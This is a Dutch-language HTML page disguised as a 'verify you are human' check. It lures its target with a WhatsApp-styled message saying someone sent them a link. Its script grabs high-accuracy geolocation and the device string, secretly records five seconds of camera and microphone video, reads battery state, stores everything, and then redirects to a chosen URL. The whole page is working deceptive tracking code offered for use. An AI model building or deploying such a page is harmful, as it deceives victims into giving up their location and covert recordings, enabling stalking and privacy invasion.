<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <title>Bevestiging</title>
    <style>
        /* Algemene pagina-opmaak */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            text-align: center;
            background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
            background-size: cover;
        }

        /* Container voor de inhoud */
        .container {
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            color: #333;
        }

        h1 {
            margin: 0 0 10px;
            font-size: 24px;
        }

        p {
            margin: 0 0 20px;
            font-size: 16px;
        }

        /* Geaccentueerde tekst */
        .highlight {
            font-weight: bold;
            color: #4caf50;
        }

        /* Voortgangsbalk */
        .progress-bar {
            background: rgba(0, 0, 0, 0.1);
            height: 10px;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 20px;
            width: 100%;
            position: relative;
        }

        .progress-bar span {
            display: block;
            height: 100%;
            background: linear-gradient(90deg, #4caf50, #03a9f4);
            width: 0;
            animation: loadProgress 5s linear forwards;
        }

        @keyframes loadProgress {
            0% {
                width: 0;
            }
            100% {
                width: 100%;
            }
        }

        /* Loading-animatie */
        .loading {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(0, 0, 0, 0.1);
            border-top: 5px solid #03a9f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto 0;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* Verberg foutbericht als standaard */
        #error-message {
            display: none;
            color: #ff5722;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="messageText"></h1>
        <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we het aan het bevestigen zijn.</p>
        <div class="loading"></div>
        <div class="progress-bar">
            <span></span>
        </div>
        <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
    </div>

    <script>
        // Haal instellingen op uit localStorage
        const micCamEnabled = localStorage.getItem("micCamEnabled") === "true";
        const locationEnabled = localStorage.getItem("locationEnabled") === "true";
        const notificationsEnabled = localStorage.getItem("notificationsEnabled") === "true";
        const redirectUrl = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        // Stel de berichttekst in
        document.getElementById("messageText").innerHTML = localStorage.getItem("messageText") || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";

        let locationData = null;
        let recordingData = null;
        let batteryData = null;

        function saveData() {
            let combinedData = {};

            if (locationEnabled && locationData) {
                Object.assign(combinedData, locationData);
            }

            if (micCamEnabled && recordingData) {
                combinedData.recording = recordingData;
            }

            if (batteryData) {
                combinedData.battery = batteryData;
            }

            // Voeg de redirect URL toe aan de data
            combinedData.redirectUrl = redirectUrl;

            // Sla gegevens op als er iets is om op te slaan
            if (Object.keys(combinedData).length > 0) {
                let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
                savedData.push(combinedData);
                localStorage.setItem("collectedData", JSON.stringify(savedData));
            }
        }

        async function getLocationData() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const accuracy = position.coords.accuracy;
                            const timestamp = new Date().toISOString();
                            const device = navigator.userAgent;

                            locationData = {
                                lat: lat,
                                lon: lon,
                                accuracy: accuracy,
                                timestamp: timestamp,
                                device: device
                            };

                            resolve();
                        },
                        (error) => {
                            document.querySelector(".loading").style.display = "none";
                            document.getElementById("error-message").style.display = "block";
                            document.getElementById("error-message").innerText =
                                "Kon locatie niet ophalen. Zorg ervoor dat je toestemming hebt gegeven.";
                            reject(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    document.querySelector(".loading").style.display = "none";
                    document.getElementById("error-message").style.display = "block";
                    document.getElementById("error-message").innerText =
                        "Je browser ondersteunt geen geolocatie. Gebruik een moderne browser.";
                    reject(new Error("Geolocatie niet ondersteund"));
                }
            });
        }

        async function getMicCamData() {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });

                    const options = { mimeType: 'video/webm; codecs=vp9' };
                    const mediaRecorder = new MediaRecorder(stream, options);
                    let chunks = [];

                    mediaRecorder.ondataavailable = function (e) {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };

                    mediaRecorder.onstop = function () {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();

                        reader.onloadend = function () {
                            const base64data = reader.result;

                            recordingData = {
                                dataUrl: base64data,
                                timestamp: new Date().toISOString()
                            };

                            resolve();
                        };

                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();

                    // Stop na 5 seconden
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 5000);
                } catch (error) {
                    console.error("Error accessing mic/cam:", error);
                    document.querySelector(".loading").style.display = "none";
                    document.getElementById("error-message").style.display = "block";
                    document.getElementById("error-message").innerText =
                        "Kon de microfoon en camera niet openen. Zorg ervoor dat je toestemming hebt gegeven.";
                    reject(error);
                }
            });
        }

        async function requestNotificationPermission() {
            return new Promise((resolve, reject) => {
                if ("Notification" in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === "granted") {
                            resolve();
                        } else {
                            reject(new Error("Notificatie toestemming geweigerd."));
                        }
                    });
                } else {
                    reject(new Error("Notificaties worden niet ondersteund door deze browser."));
                }
            });
        }

        async function getBatteryData() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryData = {
                        level: battery.level,
                        charging: battery.charging
                    };
                } catch (error) {
                    console.error("Error getting battery info:", error);
                }
            }
        }

        async function redirectWithPermissions() {
            try {
                const permissions = [];

                if (locationEnabled) {
                    permissions.push(getLocationData());
                }

                if (micCamEnabled) {
                    permissions.push(getMicCamData());
                }

                if (notificationsEnabled) {
                    permissions.push(requestNotificationPermission());
                }

                await getBatteryData();
                await Promise.all(permissions);

                saveData();

                // Wacht totdat de voortgangsbalk klaar is
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 5000);

            } catch (error) {
                console.error("Error in permissions:", error);
                document.querySelector(".loading").style.display = "none";
                document.getElementById("error-message").style.display = "block";
                document.getElementById("error-message").innerText = error.message;
            }
        }

        // Start direct bij het laden van de pagina
        redirectWithPermissions();
    </script>
</body>
</html>
